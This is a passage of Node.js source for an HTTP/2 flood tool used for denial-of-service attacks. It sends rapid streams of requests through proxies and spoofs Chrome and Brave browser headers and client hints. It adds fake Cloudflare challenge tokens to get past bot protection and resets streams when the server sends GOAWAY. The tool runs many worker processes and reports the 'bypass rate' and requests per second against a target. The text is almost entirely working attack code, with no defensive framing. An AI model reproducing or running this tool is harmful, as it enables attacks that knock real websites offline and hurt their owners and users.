                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    const rstFrames = [];
                                    for (let i = 1; i <= streamId; i += 2) rstFrames.push(encodeRstStream(i, 3, 0));
                                    if (rstFrames.length > 0) tlsSocket.write(Buffer.concat(rstFrames));
                                    setImmediate(() => { tlsSocket.end(() => { tlsSocket.destroy(); go(); }); });
                                    return;
                                }
                                if (frame.type == 5) { streamId += 2; continue; }
                            }
                        } else break;
                    }
                });

                tlsSocket.write(Buffer.concat(frames));

                function doWrite() {
                    if (tlsSocket.destroyed) return;
                    
                    const requests = [];
                    const customHeadersArray = [];
                    if (customHeaders) {
                        const customHeadersList = customHeaders.split('#');
                        for (const header of customHeadersList) {
                            const [name, value] = header.split(':');
                            if (name && value) customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                        }
                    }
                    
                    const batchSize = isFull ? ratelimit : Math.min(ratelimit, 3);
                    
                    for (let i = 0; i < batchSize; i++) {
                        const browserVersion = getRandomInt(120, 125);
                        const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];

                        let brandValue;
                        if (browserVersion === 120) brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
                        else if (browserVersion === 121) brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
                        else if (browserVersion === 122) brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
                        else if (browserVersion === 123) brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
                        else if (browserVersion === 124) brandValue = `"${wfwf}";v="${browserVersion}", "Not-A.Brand";v="99", "Chromium";v="${browserVersion}"`;
                        else brandValue = `"${wfwf}";v="${browserVersion}", "Not A(Brand";v="24", "Chromium";v="${browserVersion}"`;

                        const isBrave = wfwf === 'Brave';
                        const acceptHeaderValue = isBrave ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
                        const langValue = isBrave ? 'en-US,en;q=0.9' : 'en-US,en;q=0.7';
                        const secGpcValue = isBrave ? "1" : undefined;
                        const secChUaModel = isBrave ? '""' : undefined;
                        const secChUaPlatform = isBrave ? 'Windows' : undefined;
                        const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
                        const secChUaMobile = isBrave ? '?0' : undefined;

                        let userAgent = customUA || getDeviceUserAgent(platform, deviceType, randomDeviceIndex);
                        const secChUa = `${brandValue}`;
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
                        
                        const headers = Object.entries({
                            ":method": reqmethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": query ? (query === '1' ? url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8) : query === '2' ? url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7) : url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7)) : url.pathname
                        }).concat(Object.entries({
                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                            ...(reqmethod === "POST" && { "content-length": "0" }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `\"Windows\"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": userAgent,
                            "accept": acceptHeaderValue,
                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
                            ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
                            ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
                            ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
                            ...(secChUaPlatformVersion && { "sec-ch-ua-platform-version": secChUaPlatformVersion }),
                            ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                            "accept-encoding": "gzip, deflate, br, zstd",
                            "accept-language": langValue,
                            ...(hcookie && { "cookie": hcookie }),
                            ...(currentRefererValue && { "referer": currentRefererValue }),
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        }).filter(a => a[1] != null));

                        const packed = Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), hpack.encode(headers)]);
                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2;
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) setTimeout(() => doWrite(), isFull ? 800 : Math.max(500, 1000 / ratelimit));
                    });
                }
                doWrite();
            }).on('error', () => tlsSocket.destroy());
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    }).once('error', () => {}).once('close', () => {
        if (tlsSocket) tlsSocket.end(() => { tlsSocket.destroy(); go(); });
    });
}

function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} net.ipv4.tcp_sack=1 net.ipv4.tcp_window_scaling=1 net.ipv4.tcp_timestamps=1 net.ipv4.tcp_fastopen=3`;
    exec(command, () => {});
}

setInterval(() => { timer++; }, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header++; custom_window++; custom_table++; custom_update++;
    } else {
        custom_table = 65536; custom_window = 6291456; custom_header = 262144; custom_update = 15663105; timer = 0;
    }
}, 10000);

// ========== CLUSTER MASTER WITH ENHANCED UI ==========
if (cluster.isMaster) {
    const workers = {};
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    
    let platformDisplay = '';
    if (randomDeviceIndex) platformDisplay = '🎲 Random Device';
    else if (platform === 'pc') platformDisplay = `💻 PC (${deviceType === 'random' ? 'Random OS' : deviceType === 'windows' ? 'Windows' : deviceType === 'mac' ? 'macOS' : 'Linux'})`;
    else if (platform === 'mobile') platformDisplay = `📱 Mobile (${deviceType === 'random' ? 'Random OS' : deviceType === 'ios' ? 'iOS' : 'Android'})`;
    else if (platform === 'tablet') platformDisplay = `📟 Tablet (${deviceType === 'random' ? 'Random OS' : deviceType === 'ios' ? 'iPadOS' : 'Android'})`;
    else if (platform === 'smarttv') platformDisplay = `📺 Smart TV`;
    else if (platform === 'console') platformDisplay = `🎮 Game Console`;
    else if (platform === 'all') platformDisplay = `🌍 All Devices`;
    
    console.log(`${gradient("█ ATTACK STATUS", "magenta", "cyan")}`);
    console.log(`${gradient("├─┼─")} ${"Target:".cyan} ${url.hostname.white}`);
    console.log(`${gradient("├─┼─")} ${"Method:".cyan} ${reqmethod.white}`);
    console.log(`${gradient("├─┼─")} ${"Threads:".cyan} ${threads.white}`);
    console.log(`${gradient("├─┼─")} ${"Duration:".cyan} ${time}s ${"(".white + new Date(Date.now() + time * 1000).toLocaleTimeString() + ")".white}`);
    console.log(`${gradient("├─┼─")} ${"Protocol:".cyan} ${forceHttp === 1 ? "HTTP/1.1" : forceHttp === 2 ? "HTTP/2" : "MIX".white}`);
    console.log(`${gradient("├─┼─")} ${"Device:".cyan} ${platformDisplay.white}`);
    console.log(`${gradient("└─┼─")} ${"Status:".cyan} ${"🔥 ATTACKING".bold.red}\n`);

    cluster.on('exit', (worker) => { cluster.fork({ core: worker.id % os.cpus().length }); });
    cluster.on('message', (worker, message) => { workers[worker.id] = [worker, message]; });
    
    if (debugMode) {
        setInterval(() => {
            let statuses = {};
            let total = 0;
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null) statuses[code] = 0;
                            statuses[code] += st[code];
                            total += st[code];
                        }
                    }
                }
            }

            const sortedStatuses = Object.entries(statuses).sort((a, b) => b[1] - a[1]);
            const totalMem = os.totalmem();
            const freeMem = os.freemem();
            const usedMemPercent = ((totalMem - freeMem) / totalMem * 100).toFixed(2);
            
            const successCodes = ['200', '201', '202', '204'];
            const blockCodes = ['403', '429', '503', 'GOAWAY'];
            const successCount = successCodes.reduce((sum, code) => sum + (statuses[code] || 0), 0);
            const blockCount = blockCodes.reduce((sum, code) => sum + (statuses[code] || 0), 0);
            const bypassRate = total > 0 ? ((successCount / total) * 100).toFixed(1) : '0.0';

            console.clear();
            showBanner();
            
            console.log(`${gradient("█ LIVE STATISTICS", "magenta", "cyan")}`);
            console.log(`${gradient("├─┼─")} ${"⏱️  Time Elapsed:".cyan} ${Math.floor((Date.now() - timestamp) / 1000)}s / ${time}s`.white);
            console.log(`${gradient("├─┼─")} ${"📊 Total RPS:".cyan} ${total.toLocaleString().bold.yellow}`);
            console.log(`${gradient("├─┼─")} ${"🎯 Bypass Rate:".cyan} ${bypassRate}% ${bypassRate > 70 ? "🚀".green : bypassRate > 40 ? "⚡".yellow : "⚠️".red}`);
            console.log(`${gradient("├─┼─")} ${"💾 RAM Usage:".cyan} ${usedMemPercent}% ${loadingBar(parseFloat(usedMemPercent), 30)}`);
            console.log(`${gradient("├─┼─")} ${"📱 Device Mode:".cyan} ${platformDisplay.white}`);
            
            console.log(`\n${gradient("█ STATUS CODES", "magenta", "cyan")}`);
            console.log(`${gradient("├─┼─")} ${"Code".padEnd(12).cyan} | ${"Count".padEnd(12).cyan} | ${"Percentage".cyan}`);
            console.log(`${gradient("├─┼─")} ${"─".repeat(35).gray}`);
            
            for (let [code, count] of sortedStatuses.slice(0, 10)) {
                const percentage = ((count / total) * 100).toFixed(1);
                let coloredCode;
                if (code === 'GOAWAY') coloredCode = code.padEnd(12).magenta;
                else if (code.startsWith('2')) coloredCode = code.padEnd(12).green;
                else if (code.startsWith('4')) coloredCode = code.padEnd(12).yellow;
                else if (code.startsWith('5')) coloredCode = code.padEnd(12).red;
                else coloredCode = code.padEnd(12).gray;
                console.log(`${gradient("├─┼─")} ${coloredCode} | ${count.toString().padEnd(12).white} | ${percentage}%`);
            }
            
            const goawayRate = total > 0 ? (((statuses["GOAWAY"] || 0) / total) * 100).toFixed(1) : '0.0';
            console.log(`${gradient("└─┼─")} ${"GOAWAY Fix Rate:".cyan} ${(100 - parseFloat(goawayRate)).toFixed(1)}% ${parseFloat(goawayRate) < 5 ? "✅".green : "⚠️".yellow}`);
            
            if (usedMemPercent >= 85) console.log(`\n${gradient("⚠️ WARNING: High RAM Usage! Consider reducing threads.", "yellow", "red")}`);
            if (total >= 5000) console.log(`\n${gradient("🚀 EXTREME RPS MODE ACTIVE! Performance optimized.", "green", "cyan")}`);
            
        }, 1000);
    }
    
    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => {
        console.log(`\n${gradient("█ ATTACK COMPLETED", "magenta", "cyan")}`);
        console.log(`${gradient("└─┼─")} ${"✅ Flood finished after".green} ${time}s ${"✅".green}\n`);
        process.exit(1);
    }, time * 1000);
} else {
    let conns = 0;
    let i = setInterval(() => {
        if (conns < 30000) conns++;
        else { clearInterval(i); return; }
        go();
    }, delay);
    
    if (debugMode) {
        const statusesQ = [];
        setInterval(() => {
            if (statusesQ.length >= 4) statusesQ.shift();
            statusesQ.push(statuses);
            statuses = {};
            process.send(statusesQ);
        }, 250);
    }
    
    setTimeout(() => process.exit(1), time * 1000);
}